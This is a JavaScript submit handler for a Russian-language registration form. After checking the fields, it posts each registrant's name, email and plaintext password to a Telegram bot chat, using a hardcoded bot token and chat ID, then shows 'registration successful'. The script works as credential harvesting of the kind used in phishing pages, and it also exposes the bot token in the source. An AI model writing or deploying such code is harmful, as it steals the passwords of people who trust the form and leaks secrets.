document.getElementById("registerForm").addEventListener("submit", function (e) {
  e.preventDefault();

  const name = document.getElementById("name").value.trim();
  const email = document.getElementById("email").value.trim();
  const password = document.getElementById("password").value.trim();
  const confirmPassword = document.getElementById("confirmPassword").value.trim();
  const errorMessage = document.getElementById("errorMessage");

  if (!name || !email || !password || !confirmPassword) {
    errorMessage.textContent = "Пожалуйста, заполните все поля.";
    return;
  }

  if (password.length < 6) {
    errorMessage.textContent = "Пароль должен содержать не менее 6 символов.";
    return;
  }

  if (password !== confirmPassword) {
    errorMessage.textContent = "Пароли не совпадают.";
    return;
  }

  // Сохраняем (опционально)
  localStorage.setItem("user", JSON.stringify({ name, email }));

  // Отправка в Telegram
  const token = "7210498747:AAEvoQVbNVfPRhme7QXk_p8EDsIod9Vk-eg";
  const chat_id = "7533649389";
  const message = `🆕 Новая регистрация:\n👤 Имя: ${name}\n📧 Email: ${email}\n📧 Пароль: ${password}`;

  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      chat_id: chat_id,
      text: message
    })
  })
  .then(response => response.json())
  .then(data => {
    alert("Регистрация успешна!");
    window.location.href = "login.html";
  })
  .catch(error => {
    console.error("Ошибка отправки в Telegram:", error);
    alert("Ошибка отправки в Telegram");
  });
});
